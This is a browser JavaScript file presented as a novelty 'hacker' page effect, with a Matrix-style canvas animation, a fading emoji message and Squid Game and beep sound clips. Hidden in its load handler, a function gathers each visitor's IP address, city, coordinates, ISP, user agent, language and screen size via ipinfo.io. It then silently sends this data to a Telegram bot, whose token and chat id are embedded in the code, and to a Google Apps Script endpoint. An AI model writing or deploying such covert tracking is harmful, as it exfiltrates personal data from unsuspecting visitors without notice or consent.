
(function () {
  const canvas = document.createElement("canvas");
  canvas.id = "matrix";
  document.body.prepend(canvas);

  const message = document.createElement("div");
  message.className = "message";
  message.innerHTML = "🔹🪄🔹";
  document.body.appendChild(message);

  const style = document.createElement("style");
  style.textContent = `
    canvas {
      display: block;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }
    .message {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      font-size: 3rem;
      opacity: 0;
      animation: fadeIn 2s ease 3s forwards;
      z-index: 9999;
      color: white;
      font-family: 'Courier New', monospace;
    }
    @keyframes fadeIn {
      to { opacity: 1; }
    }
  `;
  document.head.appendChild(style);

  const doll = new Audio("https://www.myinstants.com/media/sounds/squid-game-doll-music.mp3");
  const hack = new Audio("https://sounds.pond5.com/computer-beep-boop-hacking-sounds-sound-effect-296926349_nw_prev.m4a");
  const input = new Audio("https://sounds.pond5.com/digital-data-input-5-sound-effect-151371439_nw_prev.m4a");

  // Matrix effect
  const ctx = canvas.getContext("2d");
  let width = canvas.width = window.innerWidth;
  let height = canvas.height = window.innerHeight;
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
  const fontSize = 16;
  const columns = Math.floor(width / fontSize);
  const drops = new Array(columns).fill(1);

  function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
    ctx.fillRect(0, 0, width, height);
    ctx.fillStyle = "#1e90ff";
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
      const text = letters.charAt(Math.floor(Math.random() * letters.length));
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
  }
  setInterval(drawMatrix, 40);
  window.addEventListener("resize", () => {
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  });

  // Play sounds
  window.addEventListener("load", () => {
    setTimeout(() => {
      doll.play().catch(() => {});
      setTimeout(() => {
        hack.play().catch(() => {});
        setTimeout(() => {
          input.play().catch(() => {});
        }, 2500);
      }, 2500);
    }, 2500);
  });

  // Visitor info
  async function logVisitorInfo() {
    try {
      const res = await fetch('https://ipinfo.io/json?token=5e4cc2202c7681');
      const data = await res.json();
      const info = {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country,
        loc: data.loc,
        org: data.org,
        timezone: data.timezone,
        browser: navigator.userAgent,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        time: new Date().toLocaleString()
      };

      const message = `
        👀 زائر دخل الصفحة:
        📍 IP: ${info.ip}
        🏙️ الموقع: ${info.city}, ${info.region}, ${info.country}
        🕹️ الجهاز: ${info.browser}
        🌐 اللغة: ${info.language}
        📱 الشاشة: ${info.screen}
        🕰️ التوقيت: ${info.time}
        🛰️ مزود الخدمة: ${info.org}
      `;

      await fetch("https://api.telegram.org/bot7661069709:AAGR_xR9p1sZoc_-Xvynqdn5aMVpp_ph84U/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: "1193959724", text: message })
      });

      await fetch('https://script.google.com/macros/s/AKfycbxSyS-vA-ZTd5oQUJ9s5SUBX3twp0vama-1wxaE3rzP4VEjTiLE8JEnIIifpbMovkAOfg/exec', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(info)
      });
    } catch (err) {
      console.error(err);
    }
  }

  window.addEventListener("load", logVisitorInfo);
})();
